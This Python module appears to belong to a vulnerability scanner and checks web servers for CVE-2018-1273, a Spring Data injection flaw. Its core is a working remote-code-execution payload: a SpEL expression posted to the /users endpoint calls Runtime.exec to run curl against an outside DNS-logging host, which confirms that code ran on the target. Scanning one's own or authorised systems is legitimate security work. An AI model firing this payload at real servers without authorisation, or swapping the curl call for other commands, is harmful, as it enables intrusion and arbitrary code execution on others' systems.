#!/usr/local/bin/python3
# -*- coding: utf-8 -*-
"""
   File Name：     cve_2018_1273.py
   Description :
   Author :       sule01u
   date：          2023/10/25
"""
import random
import requests
from urllib.parse import urljoin
from utils.custom_headers import TIMEOUT, USER_AGENTS
from colorama import Fore
from utils.logging_config import configure_logger
logger = configure_logger(__name__)
requests.packages.urllib3.disable_warnings()

CVE_ID = "CVE-2018-1273"


def check(url, dns_domain, proxies=None):
    """
    对给定的目标URL检测CVE-2018-1273漏洞。

    参数:
    - target_url: 待检测的目标URL
    - proxies: 代理配置
    """
    dns_domain = dns_domain or "dnslog.cn"
    payload = "username[#this.getClass().forName('java.lang.Runtime').getRuntime().exec('curl SBSCAN_cve_2018_1273.%s')]=&password=&repeatedPassword=" % dns_domain
    target_url = urljoin(url, "/users?page=&size=5")
    headers = {
        'Host': "localhost:8080",
        'Connection': "keep-alive",
        'Content-Length': "120",
        'Pragma': "no-cache",
        'Cache-Control': "no-cache",
        'Origin': "http://localhost:8080",
        'Upgrade-Insecure-Requests': "1",
        'Content-Type': "application/x-www-form-urlencoded",
        'User-Agent': random.choice(USER_AGENTS),
        'Accept': "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
        'Referer': "http://localhost:8080/users?page=0&size=5",
        'Accept-Encoding': "gzip, deflate, br",
        'Accept-Language': "zh-CN,zh;q=0.9,en;q=0.8"
    }
    try:
        res = requests.post(target_url, headers=headers, timeout=TIMEOUT, data=payload, verify=False, proxies=proxies)
        logger.debug(Fore.CYAN + f"[{res.status_code}]" + Fore.BLUE + f"[{res.headers}]", extra={"target": target_url})
        if res.status_code == 500:
            details = f"{CVE_ID} vulnerability detected"
            if dns_domain == "dnslog.cn":
                details += ",use the --dnslog parameter to specify your dnslog domain and then scan again"
            else:
                details += ",please check your dnslog record for confirmation"

            logger.info(Fore.RED + f"[{CVE_ID} vulnerability detected!]", extra={"target": target_url})
            return True, {
                "CVE_ID": CVE_ID,
                "URL": target_url,
                "Details": details
            }
        logger.info(f"[{CVE_ID} vulnerability not detected]", extra={"target": url})
        return False, {}
    except requests.RequestException as e:
        logger.debug(f"[Request Error：{e}]", extra={"target": target_url})
        return False, {}
    except Exception as e:
        logger.error(f"[Unknown Error：{e}]", extra={"target": target_url})
        return False, {}


if __name__ == '__main__':
    is_vul, res = check("http://localhost:8080/", "5pugcrp1.eyes.sh", proxies={})
    print(is_vul, res)
